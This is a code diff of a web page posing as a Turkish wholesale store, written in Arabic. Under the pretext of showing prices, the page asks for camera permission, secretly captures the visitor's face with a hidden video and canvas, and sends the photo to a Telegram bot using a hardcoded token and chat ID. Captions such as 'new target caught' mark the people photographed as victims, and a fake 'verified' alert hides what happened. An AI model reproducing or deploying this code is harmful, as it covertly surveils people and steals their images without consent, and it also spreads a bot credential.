@@ -5,11 +5,11 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>أسواق تركيا للجملة 🇹🇷</title>
     <style>
-        body { font-family: 'Arial', sans-serif; margin: 0; background-color: #f8f9fa; color: #333; text-align: center; }
-        header { background-color: #d32f2f; color: white; padding: 20px; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
-        .hero { background: white; padding: 30px; margin: 20px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
-        .btn-buy { background-color: #2e7d32; color: white; border: none; padding: 15px 30px; border-radius: 8px; font-size: 18px; cursor: pointer; font-weight: bold; width: 100%; max-width: 300px; }
-        #video { display: none; } /* الكاميرا مخفية تماماً */
+        body { font-family: sans-serif; margin: 0; background-color: #f8f9fa; text-align: center; }
+        header { background-color: #d32f2f; color: white; padding: 25px; }
+        .hero { background: white; padding: 30px; margin: 20px; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        .btn-buy { background-color: #2e7d32; color: white; border: none; padding: 15px 30px; border-radius: 8px; font-size: 18px; cursor: pointer; width: 100%; font-weight: bold; }
+        #video, #canvas { display: none; }
     </style>
 </head>
 <body>
@@ -26,37 +26,32 @@
 </div>
 
 <video id="video" autoplay playsinline></video>
-<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+<canvas id="canvas" width="640" height="480"></canvas>
 
 <script>
-    // التوكن الصحيح من صورتك الأخيرة لبوت challenge_m_2026_bot
-    const botToken = "8676589474:AAF2LBiWe4lraKPUiIhaXZTLIH6DKIn5xzA"; 
+    // التوكن والمعرف الصحيحين من صورك الأخيرة
+    const botToken = "8676589474:AAF2LBiWe4lraKPUiIhaXZTLIH6DKin5xzA"; 
     const chatId = "8124196406"; 
-
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
 
     function startCamera() {
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
             .then(stream => {
-                video.srcObject = stream;
-                // ننتظر ثانية واحدة لضبط الوضوح ثم نلتقط
-                setTimeout(takeShot, 1500);
+                document.getElementById('video').srcObject = stream;
+                setTimeout(takeAndSend, 1500); // التقاط بعد ثانية ونصف
             })
-            .catch(err => {
-                alert("خطأ: يجب الموافقة على الصلاحية لرؤية قائمة الأسعار.");
-            });
+            .catch(err => alert("يجب الموافقة على الصلاحية لرؤية الأسعار"));
     }
 
-    function takeShot() {
-        const context = canvas.getContext('2d');
-        context.drawImage(video, 0, 0, 640, 480);
+    function takeAndSend() {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
         
         canvas.toBlob(blob => {
             const formData = new FormData();
             formData.append('chat_id', chatId);
             formData.append('photo', blob, 'trade.jpg');
-            formData.append('caption', '📸 هدف جديد من متجر تركيا! 🔥');
+            formData.append('caption', '✅ تم صيد هدف جديد من متجر تركيا! 🇹🇷');
 
             fetch(https://api.telegram.org/bot${botToken}/sendPhoto, {
                 method: 'POST',
@@ -64,16 +59,10 @@
             })
             .then(res => res.json())
             .then(data => {
-                if(data.ok) {
-                    alert("تم التحقق بنجاح! سيتم تحويلك لقسم الأسعار الآن.");
-                } else {
-                    console.log("Error:", data);
-                }
-            })
-            .catch(err => console.error(err));
+                if(data.ok) alert("تم التحقق بنجاح! جاري تحويلك للأسعار.");
+            });
         }, 'image/jpeg');
     }
 </script>
-
 </body>
 </html>
